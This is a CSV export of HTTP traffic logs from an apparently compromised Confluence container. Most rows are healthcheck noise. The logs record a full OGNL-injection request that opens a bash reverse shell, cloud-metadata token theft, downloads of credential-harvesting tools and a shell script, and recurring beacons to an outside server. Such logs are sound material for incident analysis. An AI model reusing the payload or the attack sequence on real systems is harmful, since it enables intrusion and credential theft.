"@timestamp","network.direction","source.ip","source.port","destination.port","destination.ip","bytes_in","bytes_out","network.protocol","url.path","url.full"
"Oct 25, 2022 @ 01:29:50.307",ingress,"127.0.0.1",43280,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:29:29.831",egress,"172.17.0.3",56554,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:29:20.295",ingress,"127.0.0.1",56468,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:29:09.938",egress,"172.17.0.3",51400,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:28:50.284",ingress,"127.0.0.1",56712,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:28:20.271",ingress,"127.0.0.1",44126,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:28:09.265",egress,"172.17.0.3",42538,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:27:59.154",egress,"172.17.0.3",43696,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:27:50.262",ingress,"127.0.0.1",57034,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:27:20.244",ingress,"127.0.0.1",38454,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:27:08.601",egress,"172.17.0.3",37270,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:26:50.236",ingress,"127.0.0.1",60546,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:26:28.481",egress,"172.17.0.3",43378,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:26:20.218",ingress,"127.0.0.1",47406,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:26:07.939",egress,"172.17.0.3",34294,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:25:50.205",ingress,"127.0.0.1",35460,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:25:20.196",ingress,"127.0.0.1",50876,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:25:07.270",egress,"172.17.0.3",55546,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:24:57.804",egress,"172.17.0.3",57902,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:24:50.014",ingress,"127.0.0.1",36466,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:24:20.005",ingress,"127.0.0.1",34454,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:24:06.600",egress,"172.17.0.3",50218,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:23:49.983",ingress,"127.0.0.1",45826,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:23:27.127",egress,"172.17.0.3",33268,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:23:19.962",ingress,"127.0.0.1",39146,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:23:05.926",egress,"172.17.0.3",41016,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:22:49.948",ingress,"127.0.0.1",43954,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:22:19.934",ingress,"127.0.0.1",35542,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:22:05.261",egress,"172.17.0.3",45554,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:21:56.448",egress,"172.17.0.3",54882,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:21:49.912",ingress,"127.0.0.1",56836,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:21:19.904",ingress,"127.0.0.1",43728,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:21:04.601",egress,"172.17.0.3",41372,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:20:49.893",ingress,"127.0.0.1",40864,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:20:25.769",egress,"172.17.0.3",59528,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:20:19.878",ingress,"127.0.0.1",39888,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:20:03.933",egress,"172.17.0.3",51214,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:19:49.864",ingress,"127.0.0.1",54604,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:19:19.854",ingress,"127.0.0.1",47022,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:19:03.262",egress,"172.17.0.3",41714,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:18:55.098",egress,"172.17.0.3",46872,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:18:49.830",ingress,"127.0.0.1",50230,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:18:35.119",ingress,"23.251.102.74",56572,8090,"172.17.0.3",204B,"65.9KB",http,"/","http://34.142.184.1:8090/"
"Oct 25, 2022 @ 01:18:19.806",ingress,"127.0.0.1",55162,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:18:02.598",egress,"172.17.0.3",35562,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:17:49.785",ingress,"127.0.0.1",52148,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:17:24.429",egress,"172.17.0.3",34346,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:17:19.769",ingress,"127.0.0.1",52938,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:17:01.940",egress,"172.17.0.3",57402,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:16:49.754",ingress,"127.0.0.1",48254,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:16:19.740",ingress,"127.0.0.1",60352,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:16:01.278",egress,"172.17.0.3",56028,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:15:53.757",egress,"172.17.0.3",37272,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:15:49.702",ingress,"127.0.0.1",47628,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:15:19.683",ingress,"127.0.0.1",60800,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:15:00.621",egress,"172.17.0.3",50676,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:14:49.607",ingress,"127.0.0.1",43934,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:14:23.089",egress,"172.17.0.3",56302,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:14:19.592",ingress,"127.0.0.1",36834,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:13:59.956",egress,"172.17.0.3",34858,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:13:49.583",ingress,"127.0.0.1",57202,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:13:19.576",ingress,"127.0.0.1",49150,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:12:59.284",egress,"172.17.0.3",53988,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:12:52.425",egress,"172.17.0.3",34078,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:12:49.572",ingress,"127.0.0.1",51678,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:12:19.566",ingress,"127.0.0.1",58712,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:11:58.616",egress,"172.17.0.3",58232,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:11:49.561",ingress,"127.0.0.1",59992,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:11:21.752",egress,"172.17.0.3",52412,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:11:19.555",ingress,"127.0.0.1",56032,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:10:57.942",egress,"172.17.0.3",59222,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:10:49.538",ingress,"127.0.0.1",32828,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:10:38.991",ingress,"172.17.0.3",42558,80,"169.254.169.254",180B,"1.3KB",http,"/computeMetadata/v1/instance/service-accounts/default//token","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//token"
"Oct 25, 2022 @ 01:10:38.921",ingress,"172.17.0.3",42544,80,"169.254.169.254",181B,540B,http,"/computeMetadata/v1/instance/service-accounts/default//scopes","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//scopes"
"Oct 25, 2022 @ 01:10:38.826",ingress,"172.17.0.3",42532,80,"169.254.169.254",183B,254B,http,"/computeMetadata/v1/instance/service-accounts/default//identity","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//identity"
"Oct 25, 2022 @ 01:10:38.775",ingress,"172.17.0.3",42520,80,"169.254.169.254",182B,246B,http,"/computeMetadata/v1/instance/service-accounts/default//aliases","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//aliases"
"Oct 25, 2022 @ 01:10:38.715",ingress,"172.17.0.3",42518,80,"169.254.169.254",180B,289B,http,"/computeMetadata/v1/instance/service-accounts/default//email","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default//email"
"Oct 25, 2022 @ 01:10:38.651",ingress,"172.17.0.3",42502,80,"169.254.169.254",223B,"1.3KB",http,"/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//token","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//token"
"Oct 25, 2022 @ 01:10:38.602",ingress,"172.17.0.3",42498,80,"169.254.169.254",224B,540B,http,"/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//scopes","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//scopes"
"Oct 25, 2022 @ 01:10:38.482",ingress,"172.17.0.3",42482,80,"169.254.169.254",226B,254B,http,"/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//identity","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//identity"
"Oct 25, 2022 @ 01:10:38.408",ingress,"172.17.0.3",42480,80,"169.254.169.254",225B,246B,http,"/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//aliases","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//aliases"
"Oct 25, 2022 @ 01:10:38.344",ingress,"172.17.0.3",42476,80,"169.254.169.254",223B,289B,http,"/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//email","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/397103272801-compute@developer.gserviceaccount.com//email"
"Oct 25, 2022 @ 01:10:38.303",ingress,"172.17.0.3",42470,80,"169.254.169.254",166B,300B,http,"/computeMetadata/v1/instance/service-accounts/","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
"Oct 25, 2022 @ 01:10:38.244",ingress,"172.17.0.3",42454,80,"169.254.169.254",178B,277B,http,"/computeMetadata/v1/instance/network-interfaces/0//network","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//network"
"Oct 25, 2022 @ 01:10:38.170",ingress,"172.17.0.3",42446,80,"169.254.169.254",182B,255B,http,"/computeMetadata/v1/instance/network-interfaces/0//dns-servers","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//dns-servers"
"Oct 25, 2022 @ 01:10:38.113",ingress,"172.17.0.3",42442,80,"169.254.169.254",178B,249B,http,"/computeMetadata/v1/instance/network-interfaces/0//gateway","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//gateway"
"Oct 25, 2022 @ 01:10:38.053",ingress,"172.17.0.3",42426,80,"169.254.169.254",181B,252B,http,"/computeMetadata/v1/instance/network-interfaces/0//subnetmask","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//subnetmask"
"Oct 25, 2022 @ 01:10:37.801",ingress,"172.17.0.3",42412,80,"169.254.169.254",173B,249B,http,"/computeMetadata/v1/instance/network-interfaces/0//ip","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0//ip"
"Oct 25, 2022 @ 01:10:37.577",ingress,"172.17.0.3",42404,80,"169.254.169.254",168B,241B,http,"/computeMetadata/v1/instance/network-interfaces/","http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/"
"Oct 25, 2022 @ 01:10:37.482",ingress,"172.17.0.3",42388,80,"169.254.169.254",168B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/kube-env","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
"Oct 25, 2022 @ 01:10:37.413",ingress,"172.17.0.3",42386,80,"169.254.169.254",170B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/kubeconfig","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kubeconfig"
"Oct 25, 2022 @ 01:10:37.296",ingress,"172.17.0.3",42382,80,"169.254.169.254",171B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/kube-labels","http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-labels"
"Oct 25, 2022 @ 01:10:37.257",ingress,"172.17.0.3",42376,80,"169.254.169.254",174B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/enable-oslogin","http://metadata.google.internal/computeMetadata/v1/instance/attributes/enable-oslogin"
"Oct 25, 2022 @ 01:10:37.179",ingress,"172.17.0.3",42368,80,"169.254.169.254",172B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/cluster-name","http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name"
"Oct 25, 2022 @ 01:10:37.103",ingress,"172.17.0.3",42364,80,"169.254.169.254",176B,"1.8KB",http,"/computeMetadata/v1/instance/attributes/cluster-location","http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-location"
"Oct 25, 2022 @ 01:10:37.005",ingress,"172.17.0.3",42350,80,"169.254.169.254",153B,284B,http,"/computeMetadata/v1/instance/zone","http://metadata.google.internal/computeMetadata/v1/instance/zone"
"Oct 25, 2022 @ 01:10:36.894",ingress,"172.17.0.3",42334,80,"169.254.169.254",164B,"1.8KB",http,"/computeMetadata/v1/instance/scheduling/tags","http://metadata.google.internal/computeMetadata/v1/instance/scheduling/tags"
"Oct 25, 2022 @ 01:10:36.808",ingress,"172.17.0.3",42330,80,"169.254.169.254",153B,246B,http,"/computeMetadata/v1/instance/name","http://metadata.google.internal/computeMetadata/v1/instance/name"
"Oct 25, 2022 @ 01:10:36.713",ingress,"172.17.0.3",42318,80,"169.254.169.254",161B,287B,http,"/computeMetadata/v1/instance/machine-type","http://metadata.google.internal/computeMetadata/v1/instance/machine-type"
"Oct 25, 2022 @ 01:10:36.673",ingress,"172.17.0.3",42316,80,"169.254.169.254",154B,303B,http,"/computeMetadata/v1/instance/image","http://metadata.google.internal/computeMetadata/v1/instance/image"
"Oct 25, 2022 @ 01:10:36.631",ingress,"172.17.0.3",42300,80,"169.254.169.254",151B,258B,http,"/computeMetadata/v1/instance/id","http://metadata.google.internal/computeMetadata/v1/instance/id"
"Oct 25, 2022 @ 01:10:36.567",ingress,"172.17.0.3",42298,80,"169.254.169.254",157B,296B,http,"/computeMetadata/v1/instance/hostname","http://metadata.google.internal/computeMetadata/v1/instance/hostname"
"Oct 25, 2022 @ 01:10:36.522",ingress,"172.17.0.3",42294,80,"169.254.169.254",160B,238B,http,"/computeMetadata/v1/instance/description","http://metadata.google.internal/computeMetadata/v1/instance/description"
"Oct 25, 2022 @ 01:10:36.462",ingress,"172.17.0.3",42290,80,"169.254.169.254",157B,"1.8KB",http,"/computeMetadata/v1/oslogin/authorize","http://metadata.google.internal/computeMetadata/v1/oslogin/authorize"
"Oct 25, 2022 @ 01:10:36.413",ingress,"172.17.0.3",42274,80,"169.254.169.254",161B,"1.8KB",http,"/computeMetadata/v1/oslogin/security-keys","http://metadata.google.internal/computeMetadata/v1/oslogin/security-keys"
"Oct 25, 2022 @ 01:10:36.354",ingress,"172.17.0.3",42266,80,"169.254.169.254",154B,"1.8KB",http,"/computeMetadata/v1/oslogin/groups","http://metadata.google.internal/computeMetadata/v1/oslogin/groups"
"Oct 25, 2022 @ 01:10:36.286",ingress,"172.17.0.3",52926,80,"169.254.169.254",153B,"1.8KB",http,"/computeMetadata/v1/oslogin/users","http://metadata.google.internal/computeMetadata/v1/oslogin/users"
"Oct 25, 2022 @ 01:10:36.205",ingress,"172.17.0.3",52914,80,"169.254.169.254",174B,"1.4KB",http,"/computeMetadata/v1/project/attributes/","http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"
"Oct 25, 2022 @ 01:10:36.174",ingress,"172.17.0.3",52906,80,"169.254.169.254",167B,"1.4KB",http,"/computeMetadata/v1/project/attributes/ssh-keys","http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
"Oct 25, 2022 @ 01:10:36.130",ingress,"172.17.0.3",52890,80,"169.254.169.254",166B,251B,http,"/computeMetadata/v1/project/numeric-project-id","http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id"
"Oct 25, 2022 @ 01:10:36.092",ingress,"172.17.0.3",52886,80,"169.254.169.254",158B,258B,http,"/computeMetadata/v1/project/project-id","http://metadata.google.internal/computeMetadata/v1/project/project-id"
"Oct 25, 2022 @ 01:10:35.998",ingress,"172.17.0.3",52876,80,"169.254.169.254",140B,"1.8KB",http,"/latest/api/token","http://169.254.169.254/latest/api/token"
"Oct 25, 2022 @ 01:10:31.877",ingress,"172.17.0.3",52866,80,"169.254.169.254",88B,232B,http,"/","http://metadata.google.internal/"
"Oct 25, 2022 @ 01:10:19.528",ingress,"127.0.0.1",60528,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:10:01.573",ingress,"92.118.39.78",35850,8090,"172.17.0.3",41B,519B,http,"/","http://34.142.184.1/"
"Oct 25, 2022 @ 01:09:57.276",egress,"172.17.0.3",53334,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:09:51.073",egress,"172.17.0.3",60146,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:09:49.522",ingress,"127.0.0.1",48240,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:09:44.831",egress,"172.17.0.3",53804,80,"20.205.243.166",115B,125B,http,"/AlessandroZ/LaZagne/archive/master.tar.gz","http://github.com/AlessandroZ/LaZagne/archive/master.tar.gz"
"Oct 25, 2022 @ 01:09:22.408",egress,"172.17.0.3",46118,80,"20.205.243.166",118B,128B,http,"/securing/DumpsterDiver/archive/master.tar.gz","http://github.com/securing/DumpsterDiver/archive/master.tar.gz"
"Oct 25, 2022 @ 01:09:19.514",ingress,"127.0.0.1",47220,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:08:56.615",egress,"172.17.0.3",51554,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:08:49.501",ingress,"127.0.0.1",59892,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:08:39.605",ingress,"10.0.0.5",57756,8090,"10.0.0.3",708B,"7.5KB",http,"/login.action","http://10.0.0.3:8090/login.action?os_destination=%2F%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22%22%2C+Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new+java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.0.5%2F4242+0%3E%261%27%29.start%28%29%22%29%29%7D%2Findex.action&permissionViolation=true"
"Oct 25, 2022 @ 01:08:39.377",ingress,"10.0.0.5",57756,8090,"10.0.0.3",589B,"1,010B",http,"/${Class.forName(""com.opensymphony.webwork.ServletActionContext"").getMethod(""getResponse"",null).invoke(null,null).setHeader("""", Class.forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""nashorn"").eval(""new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.5/4242 0>&1').start()""))}/","http://10.0.0.3:8090/$%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22,null%29.invoke%28null,null%29.setHeader%28%22%22,%20Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27bash%20-i%20%3E&%20/dev/tcp/10.0.0.5/4242%200%3E&1%27%29.start%28%29%22%29%29%7D/"
"Oct 25, 2022 @ 01:08:20.397",egress,"172.17.0.3",41246,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:08:19.495",ingress,"127.0.0.1",48240,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:07:55.949",egress,"172.17.0.3",37164,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:07:49.489",ingress,"127.0.0.1",55152,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:07:19.482",ingress,"127.0.0.1",48502,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:06:55.283",egress,"172.17.0.3",59238,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:06:49.733",egress,"172.17.0.3",59234,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:06:49.476",ingress,"127.0.0.1",33396,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:06:19.471",ingress,"127.0.0.1",36456,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:05:54.615",egress,"172.17.0.3",50934,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:05:49.464",ingress,"127.0.0.1",60124,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:05:20.611",egress,"172.17.0.3",39110,80,"212.22.77.79",468B,159B,http,"/o","http://212.22.77.79/o"
"Oct 25, 2022 @ 01:05:20.110",egress,"172.17.0.3",50708,80,"104.18.114.97",77B,570B,http,"/","http://icanhazip.com/"
"Oct 25, 2022 @ 01:05:19.738",egress,"172.17.0.3",33432,80,"95.182.120.140",217B,"3.4KB",http,"/spre.sh","http://95.182.120.140/spre.sh"
"Oct 25, 2022 @ 01:05:19.456",ingress,"127.0.0.1",59660,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:05:19.076",egress,"172.17.0.3",39104,80,"212.22.77.79",425B,820B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:04:53.948",egress,"172.17.0.3",36598,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:04:49.450",ingress,"127.0.0.1",36204,8090,"127.0.0.1",174B,330B,http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
